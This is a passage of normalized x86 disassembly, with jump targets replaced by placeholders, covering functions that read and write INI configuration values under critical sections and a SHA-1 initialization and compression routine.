mov [ ebp + 0x3c ] 0x0
push ebx
call [ lstrlenA@IAT ]
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
mov [ ebp + 0x38 ] 0x0
push ebx
call [ lstrlenA@IAT ]
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
mov eax [ ebp + 0x7c ]
push edi
push esi
push 0xffffffff
push ebx
push 0x0
push eax
mov [ esi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax esi
mov [ ebp + 0x3c ] eax
jmp r-xdata
xor eax eax
push ebx
call [ lstrlenA@IAT ]
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
mov ecx [ ebp + 0x7c ]
push edi
push esi
push 0xffffffff
push ebx
push 0x0
push ecx
mov [ esi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax esi
mov [ ebp + 0x38 ] eax
jmp r-xdata
mov ecx [ ebp + 0x78 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp + 0x7c ]
push edi
push esi
push 0xffffffff
push ebx
push 0x0
push edx
mov [ esi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax esi
jmp r-xdata
mov ecx [ ebp + 0x74 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ ebp + 0x34 ]
mov edx [ ebp + 0x3c ]
push ecx
mov ecx [ ebp + 0x38 ]
push edx
push ecx
push eax
call [ WritePrivateProfileStringW@IAT ]
mov [ ebp + 0x68 ] 0x1
lea ecx [ ebp + 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ ebp + 0x68 ] 0x0
lea ecx [ ebp - 0x54 ]
call [ std::basic_ostringstream<char,struct std::char_traits<char>,class std::allocator<char> >::`vector deleting destructor'@IAT ]
mov [ ebp + 0x68 ] 0xffffffff
mov edx [ ebp + 0x30 ]
push edx
call [ LeaveCriticalSection@IAT ]
lea esp [ ebp - 0x60 ]
mov ecx [ ebp + 0x60 ]
mov [ fs : 0x0 ] ecx
mov ecx [ ebp + 0x5c ]
call sub_42e72f
pop edi
pop esi
pop ebx
add ebp 0x6c
mov esp ebp
pop ebp
retn 0xc
sub_420f10
push ebp
mov ebp esp
push 0xffffffff
push sub_4323d8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
lea eax [ ecx + 0x4 ]
push esi
mov [ ebp - 0x1c ] eax
add eax 0x4
push edi
push eax
mov [ ebp - 0x18 ] eax
call [ EnterCriticalSection@IAT ]
xor esi esi
mov [ ebp - 0x4 ] esi
call [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov edi eax
cmp edi esi
jne r-xdata
push edi
call [ lstrlenA@IAT ]
mov ebx eax
inc ebx
lea eax [ ebx + ebx ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
mov [ ebp - 0x14 ] esi
jmp r-xdata
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x10 ]
push ebx
push esi
push 0xffffffff
push edi
push 0x0
push eax
mov [ esi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax esi
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov [ ebp + 0xc ] 0x0
push ebx
call [ lstrlenA@IAT ]
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
xor eax eax
push ebx
call [ lstrlenA@IAT ]
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
mov ecx [ ebp - 0x10 ]
push edi
push esi
push 0xffffffff
push ebx
push 0x0
push ecx
mov [ esi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax esi
mov [ ebp + 0xc ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x18 ]
push eax
call [ LeaveCriticalSection@IAT ]
mov eax 0x1
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ ebp - 0x18 ]
push edx
call [ LeaveCriticalSection@IAT ]
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x10 ]
push edi
push esi
push 0xffffffff
push ebx
push 0x0
push edx
mov [ esi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax esi
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
lea esp [ ebp - 0x28 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
push ecx
push eax
call [ GetPrivateProfileIntW@IAT ]
test eax eax
jne r-xdata
sub_4210b0
push ebp
lea ebp [ esp - 0x6c ]
push 0xffffffff
push sub_43240a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xb4
mov eax [ rw-data ]
push ebx
mov [ ebp + 0x5c ] eax
lea eax [ ecx + 0x4 ]
push esi
mov [ ebp + 0x2c ] eax
add eax 0x4
push edi
push eax
mov [ ebp + 0x30 ] eax
call [ EnterCriticalSection@IAT ]
xor edi edi
mov [ ebp + 0x68 ] edi
push 0x1
push 0x2
lea ecx [ ebp - 0x54 ]
call [ std::basic_ostringstream<char,struct std::char_traits<char>,class std::allocator<char> >::basic_ostringstream<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ ebp + 0x68 ] 0x1
mov eax [ ebp + 0x7c ]
push eax
lea ecx [ ebp - 0x54 ]
call [ std::basic_ostream<char,struct std::char_traits<char> >::operator<<@IAT ]
lea ecx [ ebp + 0x40 ]
push ecx
lea ecx [ ebp - 0x54 ]
call [ std::basic_ostringstream<char,struct std::char_traits<char>,class std::allocator<char> >::str@IAT ]
mov [ ebp + 0x68 ] 0x2
call [ rw-data ]
mov ecx rw-data
mov [ ebp + 0x7c ] eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
push esi
call [ lstrlenA@IAT ]
mov ebx eax
inc ebx
lea eax [ ebx + ebx ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov edi esp
test edi edi
je r-xdata
mov [ ebp + 0x34 ] edi
jmp r-xdata
mov [ ebp + 0x34 ] 0x0
mov edx [ ebp + 0x7c ]
push ebx
push edi
push 0xffffffff
push esi
push 0x0
push edx
mov [ edi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax edi
mov [ ebp + 0x34 ] eax
jmp r-xdata
lea ecx [ ebp + 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov [ ebp + 0x3c ] 0x0
push ebx
call [ lstrlenA@IAT ]
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
mov [ ebp + 0x38 ] 0x0
push ebx
call [ lstrlenA@IAT ]
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
mov eax [ ebp + 0x7c ]
push edi
push esi
push 0xffffffff
push ebx
push 0x0
push eax
mov [ esi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax esi
mov [ ebp + 0x3c ] eax
jmp r-xdata
xor eax eax
push ebx
call [ lstrlenA@IAT ]
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov esi esp
test esi esi
je r-xdata
mov ecx [ ebp + 0x7c ]
push edi
push esi
push 0xffffffff
push ebx
push 0x0
push ecx
mov [ esi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax esi
mov [ ebp + 0x38 ] eax
jmp r-xdata
mov ecx [ ebp + 0x78 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp + 0x7c ]
push edi
push esi
push 0xffffffff
push ebx
push 0x0
push edx
mov [ esi ] 0x0
call [ MultiByteToWideChar@IAT ]
neg eax
sbb eax eax
and eax esi
jmp r-xdata
mov ecx [ ebp + 0x74 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ ebp + 0x34 ]
mov edx [ ebp + 0x3c ]
push ecx
mov ecx [ ebp + 0x38 ]
push edx
push ecx
push eax
call [ WritePrivateProfileStringW@IAT ]
mov [ ebp + 0x68 ] 0x1
lea ecx [ ebp + 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ ebp + 0x68 ] 0x0
lea ecx [ ebp - 0x54 ]
call [ std::basic_ostringstream<char,struct std::char_traits<char>,class std::allocator<char> >::`vector deleting destructor'@IAT ]
mov [ ebp + 0x68 ] 0xffffffff
mov edx [ ebp + 0x30 ]
push edx
call [ LeaveCriticalSection@IAT ]
lea esp [ ebp - 0x60 ]
mov ecx [ ebp + 0x60 ]
mov [ fs : 0x0 ] ecx
mov ecx [ ebp + 0x5c ]
call sub_42e72f
pop edi
pop esi
pop ebx
add ebp 0x6c
mov esp ebp
pop ebp
retn 0xc
sub_4212e0
mov edx ecx
push edi
xor eax eax
mov ecx 0x10
lea edi [ edx + 0x1c ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] eax
mov [ edx ] 0x67452301
mov [ edx + 0x4 ] 0xefcdab89
mov [ edx + 0x8 ] 0x98badcfe
mov [ edx + 0xc ] 0x10325476
mov [ edx + 0x10 ] 0xc3d2e1f0
[ edi ]
pop edi
retn
sub_421320
sub esp 0x50
mov eax [ esp + 0x58 ]
xor ecx ecx
mov ch [ eax ]
movzx edx [ eax + 0x2 ]
push ebx
push ebp
push esi
mov cl [ eax + 0x1 ]
push edi
shl ecx 0x8
or ecx edx
shl ecx 0x8
movzx edx [ eax + 0x3 ]
or ecx edx
mov [ esp + 0x20 ] ecx
xor ecx ecx
mov ch [ eax + 0x4 ]
movzx edx [ eax + 0x6 ]
mov cl [ eax + 0x5 ]
shl ecx 0x8
or ecx edx
shl ecx 0x8
movzx edx [ eax + 0x7 ]
or ecx edx
mov [ esp + 0x24 ] ecx
xor ecx ecx
mov ch [ eax + 0x8 ]
movzx edx [ eax + 0xa ]
mov cl [ eax + 0x9 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0xb ]
shl ecx 0x8
or ecx edx
mov [ esp + 0x28 ] ecx
xor ecx ecx
mov ch [ eax + 0xc ]
movzx edx [ eax + 0xe ]
mov cl [ eax + 0xd ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0xf ]
shl ecx 0x8
or ecx edx
mov [ esp + 0x2c ] ecx
xor ecx ecx
mov ch [ eax + 0x10 ]
movzx edx [ eax + 0x12 ]
mov cl [ eax + 0x11 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x13 ]
shl ecx 0x8
or ecx edx
mov [ esp + 0x30 ] ecx
xor ecx ecx
mov ch [ eax + 0x14 ]
movzx edx [ eax + 0x16 ]
mov cl [ eax + 0x15 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x17 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x1a ]
mov [ esp + 0x34 ] ecx
xor ecx ecx
mov ch [ eax + 0x18 ]
mov cl [ eax + 0x19 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x1b ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x1e ]
mov [ esp + 0x38 ] ecx
xor ecx ecx
mov ch [ eax + 0x1c ]
mov cl [ eax + 0x1d ]
shl ecx 0x8
or ecx edx
shl ecx 0x8
movzx edx [ eax + 0x1f ]
or ecx edx
mov [ esp + 0x3c ] ecx
xor ecx ecx
mov ch [ eax + 0x20 ]
movzx edx [ eax + 0x22 ]
movzx esi [ eax + 0x3e ]
mov cl [ eax + 0x21 ]
shl ecx 0x8
or ecx edx
shl ecx 0x8
movzx edx [ eax + 0x23 ]
or ecx edx
mov [ esp + 0x40 ] ecx
xor ecx ecx
mov ch [ eax + 0x24 ]
movzx edx [ eax + 0x26 ]
mov cl [ eax + 0x25 ]
shl ecx 0x8
or ecx edx
shl ecx 0x8
movzx edx [ eax + 0x27 ]
or ecx edx
mov [ esp + 0x44 ] ecx
xor ecx ecx
mov ch [ eax + 0x28 ]
movzx edx [ eax + 0x2a ]
mov cl [ eax + 0x29 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x2b ]
shl ecx 0x8
or ecx edx
mov [ esp + 0x48 ] ecx
xor ecx ecx
mov ch [ eax + 0x2c ]
movzx edx [ eax + 0x2e ]
mov cl [ eax + 0x2d ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x2f ]
shl ecx 0x8
or ecx edx
mov [ esp + 0x4c ] ecx
xor ecx ecx
mov ch [ eax + 0x30 ]
movzx edx [ eax + 0x32 ]
mov cl [ eax + 0x31 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x33 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x36 ]
mov [ esp + 0x50 ] ecx
xor ecx ecx
mov ch [ eax + 0x34 ]
mov cl [ eax + 0x35 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x37 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x3a ]
mov [ esp + 0x54 ] ecx
xor ecx ecx
mov ch [ eax + 0x38 ]
mov cl [ eax + 0x39 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x3b ]
shl ecx 0x8
or ecx edx
xor edx edx
mov dh [ eax + 0x3c ]
mov dl [ eax + 0x3d ]
movzx eax [ eax + 0x3f ]
shl edx 0x8
or edx esi
shl edx 0x8
mov esi [ esp + 0x64 ]
mov ebx [ esi + 0x4 ]
mov edi [ esi + 0xc ]
or edx eax
mov eax [ esi ]
mov ebp eax
shr ebp 0x1b
shl eax 0x5
or ebp eax
xor edi [ esi + 0x8 ]
and edi ebx
xor edi [ esi + 0xc ]
add ebp [ esi + 0x10 ]
add edi ebp
mov eax [ esp + 0x20 ]
lea eax [ edi + eax + 0x5a827999 ]
mov edi ebx
shr ebx 0x2
shl edi 0x1e
or edi ebx
mov ebx eax
shr ebx 0x1b
mov ebp eax
shl ebp 0x5
or ebx ebp
mov ebp [ esi + 0x8 ]
xor ebp edi
mov [ esp + 0x64 ] edi
and ebp [ esi ]
xor ebp [ esi + 0x8 ]
add ebx [ esp + 0x24 ]
mov edi [ esi + 0xc ]
add ebp ebx
mov ebx [ esi ]
lea ebp [ edi + ebp + 0x5a827999 ]
mov edi ebx
shr ebx 0x2
mov [ esp + 0x14 ] ebp
shl edi 0x1e
or edi ebx
mov ebx ebp
shl ebp 0x5
shr ebx 0x1b
or ebx ebp
mov ebp [ esp + 0x64 ]
xor ebp edi
and ebp eax
mov [ esp + 0x68 ] edi
xor ebp [ esp + 0x64 ]
add ebx [ esp + 0x28 ]
mov edi [ esi + 0x8 ]
add ebp ebx
mov ebx eax
shr eax 0x2
lea edi [ edi + ebp + 0x5a827999 ]
shl ebx 0x1e
or ebx eax
mov eax edi
shr eax 0x1b
mov ebp edi
shl ebp 0x5
or eax ebp
mov ebp [ esp + 0x68 ]
mov [ esp + 0x10 ] ebx
xor ebx ebp
and ebx [ esp + 0x14 ]
xor ebx [ esp + 0x68 ]
add eax [ esp + 0x2c ]
add ebx eax
mov eax [ esp + 0x64 ]
lea ebp [ eax + ebx + 0x5a827999 ]
mov ebx [ esp + 0x14 ]
mov eax ebx
mov [ esp + 0x64 ] ebp
shr ebx 0x2
shl eax 0x1e
or eax ebx
mov ebx ebp
shl ebp 0x5
shr ebx 0x1b
or ebx ebp
mov ebp [ esp + 0x10 ]
xor ebp eax
and ebp edi
mov [ esp + 0x14 ] eax
xor ebp [ esp + 0x10 ]
add ebx [ esp + 0x30 ]
add ebp ebx
mov eax [ esp + 0x68 ]
lea eax [ eax + ebp + 0x5a827999 ]
mov ebx edi
shl ebx 0x1e
shr edi 0x2
or ebx edi
mov [ esp + 0x18 ] ebx
mov edi eax
shr edi 0x1b
mov ebp eax
shl ebp 0x5
or edi ebp
mov ebp [ esp + 0x14 ]
xor ebp ebx
and ebp [ esp + 0x64 ]
xor ebp [ esp + 0x14 ]
add edi [ esp + 0x34 ]
mov ebx [ esp + 0x64 ]
add ebp edi
mov edi [ esp + 0x10 ]
lea ebp [ edi + ebp + 0x5a827999 ]
mov edi ebx
shr ebx 0x2
mov [ esp + 0x10 ] ebp
shl edi 0x1e
or edi ebx
mov ebx ebp
shl ebp 0x5
shr ebx 0x1b
or ebx ebp
mov ebp [ esp + 0x18 ]
xor ebp edi
and ebp eax
mov [ esp + 0x64 ] edi
xor ebp [ esp + 0x18 ]
add ebx [ esp + 0x38 ]
mov edi [ esp + 0x14 ]
add ebp ebx
mov ebx eax
lea edi [ edi + ebp + 0x5a827999 ]
shl ebx 0x1e
shr eax 0x2
or ebx eax
mov eax edi
mov ebp edi
shl ebp 0x5
shr eax 0x1b
or eax ebp
mov ebp [ esp + 0x64 ]
xor ebp ebx
mov [ esp + 0x68 ] ebx
and ebp [ esp + 0x10 ]
xor ebp [ esp + 0x64 ]
add eax [ esp + 0x3c ]
add ebp eax
mov eax [ esp + 0x18 ]
lea ebp [ eax + ebp + 0x5a827999 ]
mov ebx [ esp + 0x10 ]
mov [ esp + 0x18 ] ebp
mov eax ebx
shr ebx 0x2
shl eax 0x1e
or eax ebx
mov ebx ebp
shl ebp 0x5
shr ebx 0x1b
or ebx ebp
mov [ esp + 0x10 ] eax
mov ebp eax
mov eax [ esp + 0x68 ]
xor ebp eax
and ebp edi
xor ebp eax
add ebx [ esp + 0x40 ]
add ebp ebx
mov eax [ esp + 0x64 ]
lea eax [ eax + ebp + 0x5a827999 ]
mov ebx edi
shl ebx 0x1e
shr edi 0x2
or ebx edi
mov [ esp + 0x14 ] ebx
mov edi eax
shr edi 0x1b
mov ebp eax
shl ebp 0x5
or edi ebp
mov ebp [ esp + 0x10 ]
xor ebp ebx
and ebp [ esp + 0x18 ]
xor ebp [ esp + 0x10 ]
add edi [ esp + 0x44 ]
mov ebx [ esp + 0x18 ]
add ebp edi
mov edi [ esp + 0x68 ]
lea ebp [ edi + ebp + 0x5a827999 ]
mov edi ebx
shr ebx 0x2
mov [ esp + 0x68 ] ebp
shl edi 0x1e
or edi ebx
mov ebx ebp
shl ebp 0x5
shr ebx 0x1b
or ebx ebp
mov ebp [ esp + 0x14 ]
xor ebp edi
and ebp eax
mov [ esp + 0x18 ] edi
xor ebp [ esp + 0x14 ]
add ebx [ esp + 0x48 ]
mov edi [ esp + 0x10 ]
add ebp ebx
mov ebx eax
lea edi [ edi + ebp + 0x5a827999 ]
shr eax 0x2
shl ebx 0x1e
or ebx eax
mov eax edi
mov ebp edi
shl ebp 0x5
shr eax 0x1b
or eax ebp
mov ebp [ esp + 0x18 ]
xor ebp ebx
mov [ esp + 0x64 ] ebx
and ebp [ esp + 0x68 ]
xor ebp [ esp + 0x18 ]
add eax [ esp + 0x4c ]
mov ebx [ esp + 0x68 ]
add ebp eax
mov eax [ esp + 0x14 ]
lea ebp [ eax + ebp + 0x5a827999 ]
mov eax ebx
shr ebx 0x2
mov [ esp + 0x14 ] ebp
shl eax 0x1e
or eax ebx
mov ebx ebp
shl ebp 0x5
shr ebx 0x1b
or ebx ebp
mov ebp [ esp + 0x64 ]
xor ebp eax
and ebp edi
mov [ esp + 0x68 ] eax
xor ebp [ esp + 0x64 ]
add ebx [ esp + 0x50 ]
mov eax [ esp + 0x18 ]
add ebp ebx
lea eax [ eax + ebp + 0x5a827999 ]
mov ebx edi
shl ebx 0x1e
shr edi 0x2
or ebx edi
mov [ esp + 0x10 ] ebx
mov edi eax
shr edi 0x1b
mov ebp eax
shl ebp 0x5
or edi ebp
xor ebx [ esp + 0x68 ]
and ebx [ esp + 0x14 ]
xor ebx [ esp + 0x68 ]
add edi [ esp + 0x54 ]
add ebx edi
mov edi [ esp + 0x64 ]
lea ebp [ edi + ebx + 0x5a827999 ]
mov ebx [ esp + 0x14 ]
mov edi ebx
shr ebx 0x2
shl edi 0x1e
or edi ebx
mov ebx ebp
mov [ esp + 0x64 ] ebp
shl ebp 0x5
shr ebx 0x1b
or ebx ebp
mov ebp [ esp + 0x10 ]
xor ebp edi
mov [ esp + 0x14 ] edi
mov edi [ esp + 0x10 ]
and ebp eax
xor ebp edi
mov edi [ esp + 0x68 ]
add ebx ecx
add ebp ebx
mov ebx eax
shr eax 0x2
lea edi [ edi + ebp + 0x5a827999 ]
shl ebx 0x1e
or ebx eax
mov eax edi
mov [ esp + 0x68 ] edi
shl edi 0x5
shr eax 0x1b
or eax edi
mov edi [ esp + 0x14 ]
mov [ esp + 0x18 ] ebx
xor edi ebx
mov ebp [ esp + 0x64 ]
add eax edx
and edi ebp
xor edi [ esp + 0x14 ]
add edi eax
mov eax [ esp + 0x10 ]
lea ebp [ eax + edi + 0x5a827999 ]
mov eax [ esp + 0x64 ]
mov edi eax
shr eax 0x2
shl edi 0x1e
or edi eax
mov eax [ esp + 0x54 ]
mov [ esp + 0x64 ] edi
xor eax [ esp + 0x40 ]
xor eax [ esp + 0x28 ]
xor eax [ esp + 0x20 ]
mov edi eax
add eax eax
mov [ esp + 0x10 ] ebp
shr edi 0x1f
or edi eax
mov eax ebp
shr eax 0x1b
shl ebp 0x5
or eax ebp
xor ebx [ esp + 0x64 ]
and ebx [ esp + 0x68 ]
xor ebx [ esp + 0x18 ]
add eax edi
add ebx eax
mov eax [ esp + 0x14 ]
lea eax [ eax + ebx + 0x5a827999 ]
mov ebp [ esp + 0x44 ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x68 ]
mov ebx eax
shr eax 0x2
shl ebx 0x1e
or ebx eax
mov eax ecx
xor eax ebp
xor eax [ esp + 0x2c ]
xor eax [ esp + 0x24 ]
mov ebp eax
add eax eax
shr ebp 0x1f
or ebp eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x24 ] ebp
mov ebp eax
shl eax 0x5
shr ebp 0x1b
or ebp eax
mov eax [ esp + 0x64 ]
xor eax ebx
mov [ esp + 0x68 ] ebx
and eax [ esp + 0x10 ]
xor eax [ esp + 0x64 ]
add ebp [ esp + 0x24 ]
mov ebx [ esp + 0x18 ]
add eax ebp
lea eax [ ebx + eax + 0x5a827999 ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x10 ]
mov ebx eax
shl ebx 0x1e
shr eax 0x2
or ebx eax
mov ebp [ esp + 0x48 ]
mov eax edx
xor eax ebp
xor eax [ esp + 0x30 ]
xor eax [ esp + 0x28 ]
mov ebp eax
add eax eax
shr ebp 0x1f
or ebp eax
mov eax [ esp + 0x18 ]
mov [ esp + 0x28 ] ebp
mov ebp eax
shl eax 0x5
shr ebp 0x1b
or ebp eax
mov eax [ esp + 0x68 ]
mov [ esp + 0x10 ] ebx
xor ebx eax
and ebx [ esp + 0x14 ]
xor ebx [ esp + 0x68 ]
add ebp [ esp + 0x28 ]
mov eax [ esp + 0x64 ]
add ebx ebp
lea eax [ eax + ebx + 0x5a827999 ]
mov ebp [ esp + 0x34 ]
mov [ esp + 0x64 ] eax
mov eax [ esp + 0x14 ]
mov ebx eax
shr eax 0x2
shl ebx 0x1e
or ebx eax
mov eax [ esp + 0x4c ]
xor eax ebp
xor eax [ esp + 0x2c ]
xor eax edi
mov ebp eax
add eax eax
shr ebp 0x1f
or ebp eax
mov eax [ esp + 0x64 ]
mov [ esp + 0x2c ] ebp
mov ebp eax
shl eax 0x5
shr ebp 0x1b
or ebp eax
mov eax [ esp + 0x10 ]
xor eax ebx
mov [ esp + 0x14 ] ebx
and eax [ esp + 0x18 ]
xor eax [ esp + 0x10 ]
add ebp [ esp + 0x2c ]
mov ebx [ esp + 0x68 ]
add eax ebp
mov ebp [ esp + 0x38 ]
lea eax [ ebx + eax + 0x5a827999 ]
mov [ esp + 0x68 ] eax
mov eax [ esp + 0x18 ]
mov ebx eax
shr eax 0x2
shl ebx 0x1e
or ebx eax
mov eax [ esp + 0x50 ]
xor eax ebp
xor eax [ esp + 0x30 ]
xor eax [ esp + 0x24 ]
mov ebp eax
shr ebp 0x1f
add eax eax
mov [ esp + 0x18 ] ebx
or ebp eax
mov eax [ esp + 0x68 ]
mov [ esp + 0x30 ] ebp
mov ebp eax
shl eax 0x5
shr ebp 0x1b
or ebp eax
mov eax [ esp + 0x14 ]
xor eax ebx
xor eax [ esp + 0x64 ]
add ebp [ esp + 0x30 ]
add eax ebp
mov ebx [ esp + 0x10 ]
lea eax [ ebx + eax + 0x6ed9eba1 ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x64 ]
mov ebp [ esp + 0x3c ]
mov ebx eax
shr eax 0x2
shl ebx 0x1e
or ebx eax
mov eax [ esp + 0x54 ]
xor eax ebp
xor eax [ esp + 0x34 ]
xor eax [ esp + 0x28 ]
mov ebp eax
add eax eax
shr ebp 0x1f
or ebp eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x34 ] ebp
mov ebp eax
shl eax 0x5
mov [ esp + 0x64 ] ebx
shr ebp 0x1b
or ebp eax
mov eax [ esp + 0x18 ]
xor eax ebx
xor eax [ esp + 0x68 ]
add ebp [ esp + 0x34 ]
mov ebx [ esp + 0x14 ]
add eax ebp
lea ebp [ ebx + eax + 0x6ed9eba1 ]
mov eax [ esp + 0x68 ]
mov ebx eax
shr eax 0x2
shl ebx 0x1e
or ebx eax
mov [ esp + 0x68 ] ebx
mov ebx [ esp + 0x40 ]
mov eax ecx
xor eax ebx
xor eax [ esp + 0x38 ]
xor eax [ esp + 0x2c ]
mov ebx eax
add eax eax
shr ebx 0x1f
or ebx eax
mov eax ebp
mov [ esp + 0x14 ] ebp
shr eax 0x1b
shl ebp 0x5
or eax ebp
mov ebp [ esp + 0x64 ]
mov [ esp + 0x38 ] ebx
mov ebx [ esp + 0x10 ]
xor ebx ebp
xor ebx [ esp + 0x68 ]
add eax [ esp + 0x38 ]
add ebx eax
mov eax [ esp + 0x18 ]
lea eax [ eax + ebx + 0x6ed9eba1 ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x10 ]
mov ebx eax
shr eax 0x2
mov ebp [ esp + 0x44 ]
shl ebx 0x1e
or ebx eax
mov eax edx
xor eax ebp
xor eax [ esp + 0x3c ]
xor eax [ esp + 0x30 ]
mov ebp eax
add eax eax
shr ebp 0x1f
or ebp eax
mov eax [ esp + 0x18 ]
mov [ esp + 0x3c ] ebp
mov ebp eax
shl eax 0x5
shr ebp 0x1b
or ebp eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x10 ] ebx
xor ebx eax
xor ebx [ esp + 0x68 ]
add ebp [ esp + 0x3c ]
mov eax [ esp + 0x64 ]
add ebx ebp
lea eax [ eax + ebx + 0x6ed9eba1 ]
mov ebp [ esp + 0x40 ]
mov [ esp + 0x64 ] eax
mov eax [ esp + 0x14 ]
mov ebx eax
shr eax 0x2
shl ebx 0x1e
or ebx eax
mov eax [ esp + 0x48 ]
xor eax ebp
xor eax [ esp + 0x34 ]
xor eax edi
mov ebp eax
add eax eax
shr ebp 0x1f
or ebp eax
mov eax [ esp + 0x64 ]
mov [ esp + 0x40 ] ebp
mov ebp eax
shl eax 0x5
shr ebp 0x1b
or ebp eax
mov eax [ esp + 0x10 ]
xor eax ebx
mov [ esp + 0x14 ] ebx
xor eax [ esp + 0x18 ]
add ebp [ esp + 0x40 ]
mov ebx [ esp + 0x68 ]
add eax ebp
mov ebp [ esp + 0x44 ]
lea eax [ ebx + eax + 0x6ed9eba1 ]
mov [ esp + 0x68 ] eax
mov eax [ esp + 0x18 ]
mov ebx eax
shr eax 0x2
shl ebx 0x1e
or ebx eax
mov eax [ esp + 0x4c ]
xor eax ebp
xor eax [ esp + 0x38 ]
xor eax [ esp + 0x24 ]
mov ebp eax
mov [ esp + 0x18 ] ebx
shr ebp 0x1f
add eax eax
or ebp eax
mov eax [ esp + 0x68 ]
mov [ esp + 0x44 ] ebp
mov ebp eax
shl eax 0x5
shr ebp 0x1b
or ebp eax
mov eax [ esp + 0x14 ]
xor eax ebx
xor eax [ esp + 0x64 ]
add ebp [ esp + 0x44 ]
add eax ebp
mov ebx [ esp + 0x10 ]
